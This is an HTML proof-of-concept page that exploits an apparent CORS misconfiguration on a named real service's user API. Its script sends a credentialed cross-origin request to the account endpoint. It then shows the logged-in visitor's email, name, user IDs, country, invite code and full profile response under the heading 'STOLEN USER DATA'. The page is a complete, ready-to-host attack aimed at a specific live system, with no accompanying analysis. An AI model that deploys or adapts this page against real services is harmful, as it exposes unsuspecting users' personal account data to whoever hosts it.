<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS PoC — monica.im</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 2rem; }
    h2 { color: #ff4444; }
    pre { background: #1a1a1a; padding: 1rem; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
    .status { margin: 1rem 0; font-size: 1.2rem; }
    .ok { color: #00ff00; }
    .err { color: #ff4444; }
  </style>
</head>
<body>
  <h2>CORS Misconfiguration PoC — api.monica.im</h2>
  <p>Target: <code>GET https://api.monica.im/api/user/me</code></p>
  <p>Origin: <code id="origin"></code></p>
  <div class="status" id="status">Sending cross-origin request...</div>
  <pre id="output">Waiting...</pre>

  <script>
    document.getElementById('origin').textContent = window.location.origin;

    fetch('https://api.monica.im/api/user/me', {
      method: 'GET',
      credentials: 'include',
      headers: {
        'X-Client-Type': 'web',
        'X-Product-Name': 'Monica',
        'X-Client-Locale': 'en'
      }
    })
    .then(r => {
      if (!r.ok && r.status !== 200) throw new Error('HTTP ' + r.status);
      return r.json();
    })
    .then(data => {
      document.getElementById('status').innerHTML =
        '<span class="ok">✅ CORS BYPASS SUCCESSFUL — victim data read cross-origin</span>';

      const sensitive = {
        email: data.user?.email,
        name: data.user?.name,
        id: data.user?.id,
        uid: data.user?.uid,
        country: data.user?.country,
        auth_platform: data.user?.platform,
        invite_code: data.user?.invite_code,
        vip: data.user?.vip_version,
        created_at: data.user?.created_at
      };

      document.getElementById('output').textContent =
        '=== STOLEN USER DATA ===\n\n' +
        JSON.stringify(sensitive, null, 2) +
        '\n\n=== FULL RESPONSE ===\n\n' +
        JSON.stringify(data, null, 2);
    })
    .catch(err => {
      document.getElementById('status').innerHTML =
        '<span class="err">❌ Request blocked: ' + err.message + '</span>';
      document.getElementById('output').textContent = err.toString();
    });
  </script>
</body>
</html>
